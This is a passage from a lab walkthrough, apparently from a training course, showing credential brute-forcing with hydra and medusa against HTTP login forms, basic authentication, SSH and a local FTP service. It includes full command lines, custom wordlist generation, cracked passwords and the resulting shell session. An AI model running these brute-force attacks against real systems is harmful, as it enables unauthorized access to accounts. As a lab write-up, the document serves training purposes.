As we did earlier, we can use grep to filter that password list to match that policy:

```bash
$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

### Targeted user using custom wordlist

using the created custom usernames and passwords wordlist to brute force the login form of the user jane smith

```bash
 hydra -L ../Jane-usernames.txt -P jane-filtered.txt 83.136.249.34 -s 34810 -f http-post-form '/:username=^USER^&password=^PASS^:F=Invalid credentials'
...
[DATA] attacking http-post-form://83.136.249.34:34810/:username=^USER^&password=^PASS^:F=Invalid credentials
[34810][http-post-form] host: 83.136.249.34   login: jane   password: 3n4J!!
...
                                                                                    
```

## **Skills Assessment Part 1**

### Basic HTTP Authentication

```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -f 83.136.248.107 -s 42082 http-get /
```

result:

```bash
[42082][http-get] host: 83.136.248.107   login: admin   password: Admin123
```

once login. i got this message:

```bash
Congratulations!
    This is the username satwossh you will need for part 2 of the Skills Assessmentsatwossh
```

## Skills Assessment Part 2

This is the second part of the skills assessment. `YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. Use the username you were given when you completed part 1 of the skills
 assessment to brute force the login on the target instance.

```bash
nmap 83.136.248.107         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 14:56 +03
Nmap scan report for 83-136-248-107.uk-lon1.upcloud.host (83.136.248.107)
Host is up (0.019s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
111/tcp  open   rpcbind
1025/tcp closed NFS-or-IIS
3306/tcp closed mysql
```

ssh service is open on port 48330 with the user `satwossh`

### Targeting SSH service

```bash
$ medusa -h 83.136.248.107 -n 48330 -u satwossh -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -M ssh -t 3
```

result:

```bash
ACCOUNT FOUND: [ssh] Host: 83.136.248.107 User: satwossh Password: password1 [SUCCESS]
```

ssh login

```bash
ssh satwossh@83.136.248.107 -p 48330
```

### Targeting FTP Service

```bash
satwossh@ng-1742988-loginbfsatwo-nvz6o-7b5bc7ddcb-l8vnb:~$ id
uid=1000(satwossh) gid=1000(satwossh) groups=1000(satwossh)
satwossh@ng-1742988-loginbfsatwo-nvz6o-7b5bc7ddcb-l8vnb:~$ ls /home
satwossh
satwossh@ng-1742988-loginbfsatwo-nvz6o-7b5bc7ddcb-l8vnb:~$ nmap localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-01 12:02 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000030s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

```

```bash
satwossh@ng-1742988-loginbfsatwo-nvz6o-7b5bc7ddcb-l8vnb:~$ ls
IncidentReport.txt  passwords.txt  username-anarchy
satwossh@ng-1742988-loginbfsatwo-nvz6o-7b5bc7ddcb-l8vnb:~$ cat IncidentReport.txt 
System Logs - Security Report

Date: 2024-09-06

Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.

All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.

```

The username target is Thomas Smith, using the username-anarchy to create a custom username wordlist for that user

```bash
satwossh@ng-1742988-loginbfsatwo-nvz6o-7b5bc7ddcb-l8vnb:~$ ./username-anarchy/username-anarchy Thomas Smith > Thomas-smith-usernames.txt
```

Then using the medus tool to brute force the ftp service using the custom username wordlist and the passwords.txt file 

```bash
satwossh@ng-1742988-loginbfsatwo-nvz6o-7b5bc7ddcb-l8vnb:~$ medusa -h 127.0.0.1 -U Thomas-smith-usernames.txt -P passwords.txt -M ftp -t 5
```

result

```bash
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: thomas Password: chocolate! [SUCCESS]
```

ftp login: Note, you have to escape the ! symbol

```bash
ftp ftp://thomas:chocolate\!@127.0.0.1
```